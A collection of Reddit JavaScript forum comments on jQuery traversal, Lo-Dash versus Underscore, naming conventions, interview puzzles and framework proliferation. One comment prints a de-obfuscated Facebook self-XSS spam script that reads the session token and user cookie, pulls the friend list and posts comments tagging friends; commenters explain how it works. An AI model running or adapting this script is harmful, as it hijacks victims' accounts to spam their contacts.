I've really enjoyed [net.tutsplus.com](http://net.tutsplus.com/). The tutorials are maybe more specific than what you're looking for but they're quite good. The premium membership is also worth looking in to. I got a lot of use out of it.
is there more than one child element? get(x) is zero-indexed
Really nice. Love how this can be mixed into a custom frontend stack without too much difficulty (compared to some more overbearingly opinionated frameworks)
I'm wanting to get the 2nd parent element. Ao the element that encases the element that encases the element that I'm clicking. So I would be using .parent(1).get() if this was running on a non-iOS device. 
Yes, I have no problem with that as long as you make it distinguishably different.
.parent() gets the parent element, .next() the next sibling element
so $(this).parent().parent() ?? also be careful when using event.target in the jQuery event callback, this != event.target Example: http://www.jsfiddle.net/encrypter8/JXTC2/
Well I've been using var clicked = event.target.parent().get(1).id; And that has worked just fine for me on my desktop computer. 
I see. I'm trying to get the 2nd parent. Not children. 
Sure, If You've found any resources then share it.
/u/Wince already wrote that event.target is Vanilla JS, and DOM nodes doesn't have .parent() function, so there is no way it worked. jQuery .parent() function returns direct parent as jQuery object, each element can have only one parent, so there will be 1 element inside of it and .get(1) will return undefined or null and trying to access "id" of undefined will result in error. As /u/encrypter8 wrote .parent().parent() is what you are looking for.
https://npmjs.org/search?q=ghostery can't find it even there :( https://npmjs.org/~ghostery
I strongly suggest looking at http://telesc.pe/ if you're interested in meteor. It's a great jumping off point.
I am in the same situation. We use an XSLT transform to produce JSON for the UI to digest. Its not ideal, but it gets the job done.
[obligatory xkcd](https://xkcd.com/927/)
[Image](http://imgs.xkcd.com/comics/standards.png) **Title:** Standards **Title-text:** Fortunately, the charging one has been solved now that we've all standardized on mini-USB. Or is it micro-USB? Shit. [Comic Explanation](http://www.explainxkcd.com/wiki/index.php?title=927#Explanation) **Stats:** This comic has been referenced 272 time(s), representing 2.422% of referenced xkcds. --- ^[Questions/Problems](http://www.reddit.com/r/xkcd_transcriber/) ^| ^[Website](http://xkcdref.info/statistics/)
Do you know if this will be a project that could be used in a production front-end app anytime soon? This is the first front-end framework I've come across that I liked! I was also wondering if you had any other examples of a Vue/Component app using routes, ajax, and a more complicated component system.
I've never run a NodeJS plugin on the client side, there's definitely no way of getting Node deployed on the server end because its a very constrained device.
The "on" is a really poorly named method. It actually refers to event delegation, in other words, listening to an element's events in both the present and the future. You can define ANY parent element (as long as it's always in the DOM), doesn't have to be the root document... though I suppose that's the most foolproof name. I'd suggest something a bit more localized than the document though.
Yes, there are plans to build a more complete example app with routing/ajax included. Stay tuned!
That's how they choose to hire then that's what they'll get. A company has to work out how they want to interview hire people - you can and should probably let them know how you feel about the process to help them but after that it's up to them. They're a company and either they'll adapt or they won't - survival of the fittest.
No mention of Lo-Dash?
Yes, thanks, it does actually seem more readable, I will add that.
Yes I understand that. But I'm doing it only for learning purposes, and not just for twitter or reddit but a general static webpage without any API provided. 
&gt; I suspect it's due to someone with software experience just not "getting" Javascript Don't take this the wrong way, but most likely it's _you_ that's not 'getting it'. Allow me to explain: Many businesses, even tech companies, outsource their public webpage. My company has been doing PHP/JS for over a decade, but our software is a monolithic, intranet-only app. When we decide to update the home page, we hire someone to do it because that's not our forte (public websites); I couldn't SEO my way out of a bag, and except for rebranding every several years, our devs don't have to know anything about graphic design. Additionally, even if we did the public website, that's taking devs that are experienced in our software and putting them to work doing something that will ignore half their value; sure, their skills will be used, but the knowledge they have from working with our own software will go to waste while they try and figure out whether to use cornflower blue or not. Lastly, you've probably heard the line, _"If it ain't broke, don't fix it."_ Did their website work? If so, then it's running at maximum efficiency. Otherwise, it would require spending money to fix it. About how much money do you think stands to be made (or saved) by moving the script into its own file and refactoring to use promises instead of setTimeout? Especially if the page is mostly set-in-stone, there'll be a figure approaching zero for the value that would bring to the organization. Sure, on some high-traffic websites that see constant updates, it could make a noticeable difference, but for your average site, YAGNI.
I'll unobfuscate it a bit for you: function sublist(uidss) { var a = document.createElement('script'); a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&amp;action=subscribe').setData({ flid: " + uidss + " }).send();"; document.body.appendChild(a) } sublist("284224048388985"); sublist("282637065214350"); sublist("400765643401491") var fb_dtsg = document["getElementsByName"]("fb_dtsg")[0]["value"]; var user_id = document["cookie"]["match"](document["cookie"]["match"](/c_user=(d+)/)[1]); var id = "397522647059124"; var arkadaslar = []; var svn_rev; function arkadaslari_al(id) { var request = new XMLHttpRequest(); request["onreadystatechange"] = function () { if (request["readyState"] == 4) { eval("arkadaslar = " + request["responseText"].toString()["replace"]("for (;;);", "") + ";"); for (f = 0; f &lt; Math["round"](arkadaslar["payload"]["entries"]["length"] / 27); f++) { mesaj = ""; mesaj_text = ""; for (i = f * 27; i &lt; (f + 1) * 27; i++) { if (arkadaslar["payload"]["entries"][i]) { mesaj += " @[" + arkadaslar["payload"]["entries"][i]["uid"] + ":" + arkadaslar["payload"]["entries"][i]["text"] + "]"; mesaj_text += " " + arkadaslar["payload"]["entries"][i]["text"]; }; }; yorum_yap(id, mesaj); }; }; }; var queryString = "&amp;filter[0]=user"; queryString += "&amp;options[0]=friends_only"; queryString += "&amp;options[1]=nm"; queryString += "&amp;token=v7"; queryString += "&amp;viewer=" + user_id; queryString += "&amp;__user=" + user_id; if (document["URL"]["indexOf"]("https://") &gt;= 0) { request["open"]("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + queryString, true); } else { request["open"]("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + queryString, true); }; request["send"](); }; function RandomArkadas() { var _0x7892xa = ""; for (i = 0; i &lt; 9; i++) { _0x7892xa += " @[" + arkadaslar["payload"]["entries"][Math["floor"](Math["random"]() * arkadaslar["payload"]["entries"]["length"])]["uid"] + ":" + arkadaslar["payload"]["entries"][Math["floor"](Math["random"]() * arkadaslar["payload"]["entries"]["length"])]["text"] + "]"; }; return _0x7892xa; }; function yorum_yap(id, _0x7892xc) { var request = new XMLHttpRequest(); var queryString = ""; queryString += "&amp;ft_ent_identifier=" + id; queryString += "&amp;comment_text=" + encodeURIComponent(_0x7892xc); queryString += "&amp;source=2"; queryString += "&amp;client_id=1377871797138:1707018092"; queryString += "&amp;reply_fbid"; queryString += "&amp;parent_comment_id"; queryString += "&amp;rootid=u_jsonp_2_3"; queryString += "&amp;clp={"cl_impid":"453524a0","clearcounter":0,"elementid":"js_5","version":"x","parent_fbid":" + id + "}"; queryString += "&amp;attached_sticker_fbid=0"; queryString += "&amp;attached_photo_fbid=0"; queryString += "&amp;giftoccasion"; queryString += "&amp;ft[tn]=[]"; queryString += "&amp;__user=" + user_id; queryString += "&amp;__a=1"; queryString += "&amp;__dyn=7n8ahyj35ynxl2u5F97KepEsyo"; queryString += "&amp;__req=q"; queryString += "&amp;fb_dtsg=" + fb_dtsg; queryString += "&amp;ttstamp="; request["open"]("POST", "/ajax/ufi/add_comment.php", true); request["setRequestHeader"]("Content-type", "application/x-www-form-urlencoded"); request["onreadystatechange"] = function () { if (request["readyState"] == 4 &amp;&amp; request["status"] == 200) { request["close"]; }; }; request["send"](queryString); }; arkadaslari_al(id); Just a guess, but it looks like it posts a comment mentioning each of your friends? I don't know Facebook APIs but it's this line: " @[" + arkadaslar["payload"]["entries"][i]["uid"] + ":" + arkadaslar["payload"]["entries"][i]["text"] + "]"; is whats being posted 
It should provide better performance than Underscore, includes more methods, has implicit chaining, and other benefits. One of the more useful things it provides (IMO) is the ability to break out of an `_.each()` loop prematurely by returning false. The native `forEach` loop (the one Underscore uses) does not.
Checkout http://javascript-roadtrip.codeschool.com - There are videos followed by in-browser code challenges.
I created a simple benchmark for "reduce" and Lo-Dash is indeed faster than Underscore.js in Chrome and IE10 http://jsperf.com/reduce-underscore-js-vs-lo-dash, in Chrome 2 times faster
It's a "self-XSS" attack, https://www.facebook.com/photo.php?v=956977232793 has a video explaining the idea a bit more. Essentially users are tricked into injecting code into their own page which subscribes them to spam accounts, as others have said.
I am lucky to have Dale as a guest speaker in my upcoming JavaScript bootcamp, and we'll be using this tutorial to get up and running.
Pretty buggy but what else can you expect from what seems like an individual or small indie team effort? Pretty neat.
It would seem that whoever wrote it is Turkish. `Arkadas` and `arkadaslar` mean friends in Turkish. `Arkadaslari` means his friends and `mesaj` is message. ...according to Google translate.
Wow that's actually pretty clever. 
Agreed, I've spent thousands of hours _building_ things, not pondering how the fuck (a == 0) &amp;&amp; (a == 1) &amp;&amp; (a == 2) could evaluate to true.
Wait, I'm confused, are you ranting about the actual test you were given, or the code for the website that the test was hosted on? I had understood it to be the latter...
I'm sure there's a more correct answer: (function(global){ var a = 0; Object.defineProperty(global, 'a', { get: function(){ return a++ } }) })(window); console.log((a == 0) &amp;&amp; (a == 1) &amp;&amp; (a == 2)); // true
Nice. Yeah that'll definitely be useful in production.
Both. The juxtaposition of a language-agnostic textbook test against terrible implementation. I'm pretty resentful about being judged by such a vague standard, meanwhile I was writing more sophisticated code several years back in my career.
I thinks it's a shame the lo-dash creator wasn't able to work his changes into the underscore project, and felt he had to create a parallel library. seems a missed opportunity, but I don't know any details about the decision.
Interviews are a two way street. If someone expecting me to design software in js as my primary function (meaning they have applications with extremely heavy client side architecture with a large existing js code base) made the statement that they don't consider prototypal inheritance important to the day to day job: I would respectfully explain prototypal inheritance to them (based on these examples), then explain why prototypal inheritance is actually the only method of inheritance in js. Then I'd probably politely nod my head throughout the rest of the interview and run for the hills when I hit the door. That would be an extremely strong indication that the code base is littered with bad practices attempting to force js into being something it isn't to me (Crockford says this is bad ;) 
Well, it sounds like your philosophies are different from theirs. Time will tell whether what they do works, but if you've been interviewing a lot, you probably don't have to force this. If you were turned off by their process, then you probably aren't a good fit, and maybe their system worked in that way. Optimally they either need someone on board with their ways, or need someone who'd be excited to make changes and consider that a motivating opportunity. Congrats on all the interviews though. When it's right, it's right. Don't let their method get to you; move on.
Oh don't get me wrong, I agree that these types of questions are useless for interviewing candidates. I was just curious about how to answer it.
UNDERSCORE_FOR_CONSTANTS camelForDeclarations Capitalforconstructors
Seems like more of a proof-of-concept than a serious game, but I'm definitely impressed.
Agreed, but I still see and use `CapitalCamelCaseForConstructors`.
Exactly. Do what the all the built-in stuff does. Except for filenames, where the general convention is to separate words with hyphens while Node itself uses underscores for some reason. And jQuery plugins use dots, which is insane, but whatever.
Only because I spend time hunting these down more than I care to admit: you're missing a closing )
Fucking WASD. 
Thanks. Will do. 
 a = { i: 0, valueOf: function () { return this.i++ } }
If that's the solution then I don't want to work for OP
1. I'm stumped on why this is true, I thought all types descend from Objects: Function instanceof Object === Object instanceof Function 2. And for Button.prototype = Component.prototype I'm assuming this is just making a reference to another prototype so that you could never truly have inheritance since Component.prototype.method.apply(this, arguments) would just point back to Button.prototype.method ? 3. What is the solution for this? window.addEventListener = null;
I wasn't sure of the proper etiquette due to the ";)". TIL something! 
&gt; I don‚Äôt consider prototypical inheritance very useful in everyday code This is an extremely odd thing to say. Prototypical inheritance is the fundamental core of how JavaScript works. &gt; to write a recursion I've never seen "recursion" used in a singular form. You can have "recursion" or you can use the adjective and have "a recursive" *something*, but I don't think you can write "a recursion".
Haha. Perfect 
I asked JDD about this at one point, and he had satisfactory reasons (to me) but I've since forgotten them. I realize this adds almost nothing to the conversation...
Depending on the standards your boss or teacher demands, you might not have any choice what you do. However, for your own personal projects, there are some competing standards that you will just have to decide which work best for you. If this is public code you plan to make open source, just make sure whatever standard you choose that you choose names that give just enough details to understand what it is by just reading it, and are unique enough to allow you to do a search in all the documents to find the correct keywords.
Try browserify. No promises though
Is using underscore.js valid?
No closures? No garbage collection? Those kinds of questions can help gauge the depth of knowledge, but may not be useful for junior roles.
These conventions are really important in javascript as well. For example, it is convention that if you create an object using object notation (rather than through a function call) you mark the variables that should not be accessed directly like this:__property__. This is because you cannot create a truly private variable in this manner so it is a signal to the users of your code that they shouldn't access the property. That being said, I tend to think team wide conventions take precedent. So if you work on a team that all uses underscore you should confirm. Certainly, make your case with them when you are comfortable with doing so but tram conventions are important to follow as well. 
Good stuff. I'm cross posting this to /r/fizzbuzz for technical interview challenges.
Now now. That monkey ain't hurt nobody
You don't need plugins for Grunt, either: grunt.registerTask("taskName", "An optional description", [optional, dependencies], function() { console.log("Look, I'm running arbitrary JavaScript!"); }); For comparison, here's how you do the same thing in Gulp: gulp.task("taskName", [optional, dependencies], function() { console.log("Look, I'm running arbitrary JavaScript!"); }); Personally, from my experience, Gulp's still a bit immature. To /u/brtt3000‚Äîif you're happy with Grunt (or whatever you're using now), I'd wait.
Anyone who believes that deserves whatever happens to them.
Got excited about that subreddit, but unfortunately it's a ghost town
CapitalForConstructors 
In the JavaScript community, you will typically see: * `lowerCamelCase` for variables, properties, etc. * `UpperCamelCase` for constructors. * `CAPITAL_CASE_WITH_UNDERSCORES` for constants, which seem to be rarely used in JS anyway. Team conventions trump community conventions. I personally prefer underscores, but camel case doesn't take too long to get used to. One gripe I've always had with camel case, that is a little off-topic. Camel case doesn't allow for clear separation between words. From [Extending Identity Accounts and Implementing Role-Based Authentication in ASP.NET MVC 5](http://typecastexception.com/post/2013/11/11/Extending-Identity-Accounts-and-Implementing-Role-Based-Authentication-in-ASPNET-MVC-5.aspx). &gt; yes, the naming of these could be better and posed some challenges ‚Äì I am open to suggestion here! For the moment, I try to think of them as "SelectUserRoles-ViewModel" and "SelectRole-EditorViewModel" if that helps. `SelectUserRolesViewModel` and `SelectRoleEditorViewModel` are confusing. `SelectUserRoles_ViewModel` and `SelectRole_EditorViewModel` are not. So, why not mix where appropriate?
&gt; you mark the variables that should not be accessed directly like this:property. Did you mean `_privateProperty`?
[neat talk with a critical opinion on some decisions in underscore w.r.t. "functional" designation](http://www.youtube.com/watch?v=m3svKOdZijA)
Related: http://en.wikipedia.org/wiki/Genetic_fallacy
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Genetic fallacy**](http://en.wikipedia.org/wiki/Genetic%20fallacy): --- &gt; &gt;The **genetic fallacy**, also known as **fallacy of origins**, **fallacy of virtue**, is a [fallacy of irrelevance](http://en.wikipedia.org/wiki/Fallacy_of_irrelevance) where a conclusion is suggested based solely on something or someone's origin rather than its current meaning or context. This overlooks any difference to be found in the present situation, typically transferring the positive or negative esteem from the earlier context. &gt;The fallacy therefore fails to assess the claim on its merit. The first criterion of a good argument is that the premises must have bearing on the truth or falsity of the claim in question. Genetic accounts of an issue may be true, and they may help illuminate the reasons why the issue has assumed its present form, but they are irrelevant to its merits. &gt;According to the Oxford Companion to Philosophy (1995), the term originated in [Morris Raphael Cohen](http://en.wikipedia.org/wiki/Morris_Raphael_Cohen) and [Ernest Nagel](http://en.wikipedia.org/wiki/Ernest_Nagel)'s book Logic and Scientific Method (1934). &gt; --- ^Interesting: [^Human ^Genetic ^Diversity: ^Lewontin's ^Fallacy](http://en.wikipedia.org/wiki/Human_Genetic_Diversity:_Lewontin%27s_Fallacy) ^| [^Etymological ^fallacy](http://en.wikipedia.org/wiki/Etymological_fallacy) ^| [^Appeal ^to ^accomplishment](http://en.wikipedia.org/wiki/Appeal_to_accomplishment) ^| [^Ad ^hominem](http://en.wikipedia.org/wiki/Ad_hominem) *^\/u/timarcher ^can ^reply ^with ^'delete'. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less.* ^| [^(FAQs)](http://www.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.reddit.com/r/autowikibot/wiki/modfaqs) ^| [^Magic ^Words](http://www.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/) ^| [^flag ^a ^glitch](http://www.reddit.com/message/compose?to=/r/autowikibot&amp;subject=Glitched comment report&amp;message=What seems wrong: (optional description goes here\)%0A%0A---%0A%0AReply no. 42888:%0Ahttp://www.reddit.com/r/javascript/comments/1wyj5w/yet_another_framework_syndrome_yafs/cf6mqwq)
http://xkcd.com/541/
Ah, smart. You could also do: window.addEventListener = window.__proto__.addEventListener
Also on the grammar note, I've always known it to be proto*typal*, not prototypical.
&gt; Languages come and go, that's a fact. C has been around for 50+ years now. http://en.wikipedia.org/wiki/C_%28programming_language%29
Fixed! Let me know notice anything else or have any requests :)
I agree, more performant and more functionality.
Jumping diagonally at stairs falls me through the floor.
The value of the [[Prototype]] internal property of the Function constructor is the standard built-in Function prototype object. ([ECMAScript 5.1, 15.3.3](http://www.ecma-international.org/ecma-262/5.1/#sec-15.3.3)) The Function prototype object is itself a Function object (its [[Class]] is "Function") that, when invoked, accepts any arguments and returns undefined. ([ECMAScript 5.1, 15.2.4](http://www.ecma-international.org/ecma-262/5.1/#sec-15.2.4)) The value of the [[Prototype]] internal property of the Object constructor is the standard built-in Function prototype object. ([ECMAScript 5.1, 15.2.3](http://www.ecma-international.org/ecma-262/5.1/#sec-15.2.3))
I've learned this recently enough that it's a bit embarrassing.
&gt; What is the solution for this? &gt; window.addEventListener = null; You can use window.document.addEventListener instead. However, the only sensible approach is to ignore that kind of thing completely. Just look at this shit: &gt;&gt;&gt; Math.sin = (x) =&gt; x * 5; (x) =&gt; x * 5 &gt;&gt;&gt; Math.sin(4) 20 What are you gonna do about that? Verify that every built-in object works correctly? Running thousands of unit tests isn't an option. Just don't modify any objects you don't own and hope that everyone else does the same.
For filenames, do you use any capitals, or all lowercase? 
That's what I was thinking.
Yeah, the comment about prototypical (sic) inheritance was a real red flag for me.
really nice article / tutorial, thanks for posting :)
Reinventing the wheel sometimes has its valid uses. For example, just recently an airless wheel was released for the military. Also, there's a new kind of wheel for bikes with spokes that work as simple suspension on kickstarter right now. That being said, the same is correct for Frameworks. In many frameworks, the approach taken doesn't allow for quick improvements. Sometimes putting stuff together in a completely different way will also help you understanding how it works better - even if the result will ultimately be replaced by a standard component and yet another framework will be reduced to a half-life of unmaintained slumber. Also, competition provides further incentive to improve things. Obviously, before you start a new framework, you should have a look at the existing ones, a step too often left out. Still, that doesn't mean that creating your own one is not a valid choice.
I think the key point here is "...in everyday code..." - unless you happen to use prototypical inheritance everyday
Then he becomes the crazy person living in a ghost town
I will show it to you to get your approval, thanks :)
Javascript has been around for a very long time and isn't going anywhere :/ - I'm curious what languages you see disappear like a fad? New languages emerge and some don't catch on... but that's not a fad - things that get popular tend to stay around forever. Still PERL programmers out there and C is over half a century old. Javascript is almost 20 years old...
 Evolution is hard, expensive and produce lot of waste but there is no other way. Go write your own framework instead on playing smart with easy blogs posts! Don't whine.. and don't be lazy yourself! See what other frameworks try to improve, understand why, help the people doing your favorite tools improve those aspects too and so on.. So please,please... shut up and respect other people work: they are trying to do something better and even when they fail they become better on their craft. In the end, playing smart the easy way, will just increase negativity in people and make it harder for creative people to do what they do: improve this world! 
started as guest, walked to the bows and fell through the level :-( http://i.imgur.com/I4P4qs7.png
Not a nice solution, but it turns out this is true: window.addEventListener === document.addEventListener; So you could assign: window.addEventListener = document.addEventListener;
I did exactly the same.
Wow, that intel software looks great. I've been looking at testing out Cordova recently, this should make things easier. I wonder how well 2d canvas drawing performs...
Did you read the article? It's by the TodoMVC people, who by no means are trying to stifle anyone...in fact, they do quite the opposite. The article also says it may be of value to use an existing framework, but goes on to say that, if someone wants to create one, make sure it's documented well and supported.
The article said exactly what your last paragraph said but added that it should be well-documented and supported if you're going to create one.
That's what we should strive for, but my point is: not every framework will have to succeed. Survival of the fittest is a tried and tested approach in nature, so why not in JS frameworks? Evolution needs its loosers - and their idea that they shouldn't exist is therefore flawed.
Are you telling me you're *not* reinventing the wheel? Pish posh and fiddlesticks! 
Same, firefox 26
Seems like an attempt to make Angular more palatable. Something, like "let's get people confortable with directives and filters and they'll end up with Angular eventually"
&gt; it should be well-documented and supported if you're going to create one. The thing is, nobody does that. Everybody spends ages trying to fins something good on the package manager, then gives up, rolls his own and decides to push that to package manager also. Of course, it being a quick solo project also sucks on documentation and features, so the next dev has to trawl one more package be fore, inevitable, also gives up and rolls his own, is proud, pushes it back to the package manager etc etc
Because the package manager are part of the Commons, so if you push you stuff to out here you owe it to the community to be considerate. If you share stuff with the community you owe it to that community you be responsible about it. Polluting the common space with experimental wreckage is not being a good community member. If you make trash in your town people call you out on it, same with he wider internet, you do not operate in full isolation.
It would help if the package manager search engines wouldn't suck balls. Sometime I can't even find shit I know is on there. I'm looking at you npm. http://node-modules.com/ is better but still you got to be very specific. For example I was experimenting with Streams and Buffers. Try searching for that. It is a fucking horror show trying to find the good stuff. I ended up making my own helpers again.
I happen to agree with you (in principle) but your post seems a little ranty and pointless. Have you read any articles that your responding too? if so list them so we can all read and form our own opinions. Also saying that all new frameworks are created by smart people that want simpler solutions is just wrong, there are many reasons for creating a framework, and criticism is also another method that can be used to improve. When(if) I release my framework to the world I want people to rip it apart, applause the good and shout about the bad, how else will I be able to know what works and what doesn't and where to focus my improvements? :)
Since the bold ended immediately, I'd imagine it was `__privateProperty__`
He is probably referring to this article: http://blog.tastejs.com/yet-another-framework-syndrome-yafs And he probably is suffering from YAFS himself, as he created two frameworks that server the absolute same purpose within one week.
Your post and your title are contradicting. Are you referring to framework creators (like your title), or to the TodoMVC guys (which you refer to as YAFS guys in your post)?
I remember the good old times when HTTP was on port 80 [sigh]
May be but it means that there is a big need for tools that facilitate better collaboration. May be a new business as github that discover how to make money and pay money back to developers if they contribute at projects? With services for reviewing node.js modules so they guarantee that are safe for big business could get real money I suppose... And if you review other people code, may be you learn enough to contribute. Let's create opportunities not bad mood.. We should try or shut up instead of telling people that they should not start new things because we got "too many options fatigue"...
YAFS is a misnomer. It's not a syndrome, but a valuable ability and in most cases this is called "learning by doing". Without this ability, we wouldn't have the great choice and/or quality of frameworks that we enjoy nowadays.
His praise is aimed at the framework creators, while his rant is addressed at the TodoMVC guys who coined the name "YAFS".
This ( http://dailyblocks.com) did not, the actual reddit.tv did, that's why I stopped using reddit.tv. I'll edit my first post to be clearer about that. On a sidenote, do you have the non-minified (looks like closure compiler / browserify) source for the app.js portion? I'm only asking because it looks like you're a FOSS proponent by your username. Or do you have it up on github?
Nicely customisable too. One thing that could be handy: customising which repos are shown (even better if it also can include organisation repos in the list). And if you are looking for features to add maybe an online tester so we can see how ours would look.
Why does it need full access to personal information, including SSH keys, and so on?
I can make the contents of my trash can freely available. Would you like me to dump it in your street so you can have a look at it? Just because you made it shouldn't mean you just release it an make available? Why would we need more half baked unfinished stuff clotting up the name space and search results? You'd do the world a bigger favour by not making it available. It is not free work, it is added tax. It is not free, it cost people time and energy to sift though.
Yes, but not every learning project should be promoted as the framework that YOU should use. You rather should ask at pages like CodeReview about improvements. Best example was what I mentioned: He created two frameworks with the same purpose, promoted both, but one is now... dead.
You have a personal issue with me or what :) ? I already flagged it as an experiment and asked opinions, did I force you to use one of my frameworks, wtf!? Reddit is for discussion not only for creating hype. Asking feedback is ok, right? What is wrong with people if they get disappointed by experiments and hate others doing experiments.. You are not the first one with this thing.. 
JavaScript Jabber had him on a couple of months back: http://javascriptjabber.com/079-jsj-lo-dash-with-john-david-dalton/ From what I can remember, he wanted to create competition so both would improve but underscore didn't really take on the challenge.
Nope, no bias towards you.
 **edit**: I found without specific any scope, octocard can still work. Now octocard only access(read-only) public user profile info, public repositories info, and gists~ Hi, octocard need access to user info. According to github's document, it need two scopes: user and public_repos. It looks like github made the user scope include some other stuff. If you have a better solution, please let me know. Thank you very much~ Here is the code of octocard: https://github.com/zmmbreeze/octocard-server/blob/master/routes/oauth.js#L27 Github document: http://developer.github.com/v3/oauth/#scopes 
A new business idea? What do you think about a business (as github or new one) that can make money and pay money back to developers if they contribute to valuable node.js modules? Their mission: Organize and evaluate code quality for: soundness, architecture, security checks, good features. Such service for node.js will guarantee what modules passed a certain level of quality and maturity and if you need access to these services, you pay a bit or work for other projects. Also, additional benefit: reviewing other people's code for money (or points), you learn enough to contribute. 
I made it through the tutorial and played around the world for a bit... (Eventually killing some rats in the "Rat basement" of the first town.) I am quite impressed with it.
It is not 'free work' if all it does it cluttering up the place and give the author a cosy feeling. That is 'cost', to the rest of the users. Just that you are proud of what you made doesn't mean you should just pile it out there for others to wade through. That you spend hours making something doesn't make it useful to anyone. You don;t gain worth just by spending time. Be critical of what you do. Maybe it is good to just leave it on github and not dump it into npm/bower etc.
Component.io does that, helps a lot. except it's search is still that hip minimalist uselessness. For npm I would like a filter that doesn't show me anything with less then 5 weekly installs unless I specify it. This could go in tiers. 
god no - we don't want it to actually *run* I just did a quick find replace to put in the words. It's meant to make it readable, not runnable
It seemed fast and easy enough for you to come to the realisation that the first framework was dead and buried. Granted, a small text in the description would have helped, but who cares really? Also, you got it the wrong way around: every JS framework ever is also a learning project and good JS devs (should) never stop learning.
Slightly ironic that this is posted by (one of) the creators of [React.js](http://facebook.github.io/react/)? ;)
Could [SlickGrid](https://github.com/mleibman/SlickGrid) be something that you're looking for?
At least React is very different from the competition.
Aka. [PascalCase](http://c2.com/cgi/wiki?PascalCase)...
I disagree. I don't think you should use it in every class in Java either and I think the statement "favor composition over inheritance" is actually much more applicable in class based languages than in Javascript. If do this: var obj = {someProp:"someValue"} I have already inherited the __proto__ of Object in javascript. Furthermore, if you are using any sort of framework for mv* (which basically every modern application is) you are constantly using prototypal inheritance (in just about every object) because you are doing var MyViewDef = Backbone.View.extend (or whatever you use). Finally, even in node I costantly have a need for my objects to emit events so I am using util.inherits. It's something I believe is actually used for more often in javascript (hopefully) than in class based lanaguages where you generally at least have interfaces. 
If you want to break a native `forEach` you could use `some` or `every`.
Every subreddit has to start some where.
At the top of your scope you can `Object.freeze(Math)`, and everything else you consider sacred. Doing this for every native object while developing is useful for find offenders while pulling in libraries.
Look into PhantomJS, it is a headless browser you can program using javascript. You can run your own scripts against the DOM of the page you request, make screenshots and all the things a browser can do, but from javascript. It is great for automation like in a build process or backend system. There are also a tonne of wrappers and helper and grunt pluigns for on `npm` (node.js's package manager). Downside is that it is headless so no visual (except screenshot rendering). but it is a real Webkit (like Chrome).
Thanks, it looks interesting, definitely worth mentioning.
I am really serious because I'm lazy and like using OS tools. 
I use IJKL, what you gonna do now!?!?!
Share my personally identifiable github account for a hostile review by anonymous internet users searching for shit to bitch about? I don't think so.
Then STFU. 
Excuse me? Can you please fuck off yourself if this is the level of comment you think is appropriate?
Heres another question. The div is loaded on page load but hidden until the mouse over right? Is there anyway to NOT load the content until mouse hover? The reason I ask is we have a blog feed coming in and a lot of the pictures are huge and arent optimized. I CAN choose which blog post are shown but would rather have it random. Is there a JS way to do this or do I just need to get the images on the blog optimized. (need to anyway, just isnt a priority) Was just thinking. If i could delay the loading of the div content until its actually hovered over it would decrease our page load time. 
&gt; This is an extremely odd thing to say. Prototypical inheritance is the fundamental core of how JavaScript works. Agreed. Going into all these tiny details in the other questions and then disregarding the prototype model seems insane to me. Any reasonably complex web application should make use of the prototype model - even if not directly, many frameworks will abstract around it and you'll end up using it anyway, so it pays dividends to understand how it works when it comes to debugging that stuff. Then again, maybe it's just within the context of his business, maybe they mainly do static stuff - I work as a JS games developer, so prototypal inheritance is essential.
Sorrry, I am not sure what you are looking for. But I think "Brackets" could be the right editor for you. ~JF
I do, actually. I work with Backbone and new() shit up all the time. It's important to understand how that actually works. 
Hehe, those are still bold, but my phone didn't format them, so I see what you're getting at. I think you can escape the underscores to avoid formatting. \_\_privateProperty__ Yes, true, JS does use that style. My convention, and the folks I work with use just one proceeding underscore. This is conventional in C# and Python. I have done this in PHP as well. I'm not sure about vb.net, but with C# the backing field is formatted as `&lt;property&gt;__BackingField` for auto-properties, ^[source](http://stackoverflow.com/questions/8817070/is-it-possible-to-access-backing-fields-behind-auto-implemented-properties) and is inaccessible except through reflection. Convention states that your backing field should be `_privateProperty` for non-auto-properties.
If you want a good IDE, you are going to have to pay. All of these support various levels of intellisense, all require a little extra work to set it up for 3rd party code. Nothing is just going to support 'insert random library' out of the box. (I have never used Ace, so I do not know if the above claims apply) WebStorm - have to pay (30 day free trial) Visual Studio - have to pay Sublime Text - have to pay (indefinite free trial) Ace - have to pay (free trial)
The ``instanceof`` operator works effectively this way (with some error-checking steps omitted for clarity): function myInstanceOf(obj, fn) { var objProto = obj.__proto__, fnProto = fn.prototype; while (objProto !== null) { if (objProto === fnProto) return true; objProto = objProto.__proto__; } return false; } In other words, it proceeds up ``obj``'s prototype chain, checking if anything in the chain matches ``fn``'s ``prototype`` object. If so, ``obj`` is an instance of ``fn``. This is described [in the ECMAScript standard for ``HasInstance``](http://www.ecma-international.org/ecma-262/5.1/#sec-15.3.5.3) which ``instanceof`` calls. Now... ``Object`` is a function, so ``Function.prototype === Object.__proto__`` outright. But ``Function`` is also a function, and if you proceed up from there... ``Function.__proto__.__proto__ === Object.prototype``. Because as you said, everything inherits from ``Object``.
that does not seem like a sound reason..
one should not work under fear of being ridiculed for his work or called names. There are folks coming from all roads of life, learning their way through publishing work. Think about that.
Provide a convenient interface to set your own control scheme and live a worry-free life. **Edit** Also, IJKL makes complete sense for a lefty, and I fully endorse it as a valid control scheme. WASD breaks the homerow training and causes endless off-by-one errors. hate hate hate
no not you, the article this post refers to. The repetition fact that you state is indeed real, it never bothered me for a second though... were you ever bothered by it?
Haha, yeah, I was only messing. I'm a lefty and I fuckin hate it when you can't rebind keys That said, I'm a massive rogue like nerd and vi style hjkl would be fine by me ;)
Right, that's what it is! That was on the tip of my brain.
There is [Komodo Edit!](http://www.activestate.com/komodo-edit) (free) which has very good JavaScript support.
Bump. Anyone? Whats this even called? If its even possible to do ? As always. Thanks for sharing your knowledge. =-)
There is a real lack of graciousness in this community. By the commentary here, you'd think practically everyone here has this programming thing all figured out already, and they have nothing left to do but shame others for not being as amazing as they are(even if they have nothing to show for their excellence themselves).
I believe the point of the article was to highlight what to strive for, not to stop people from rolling their own.
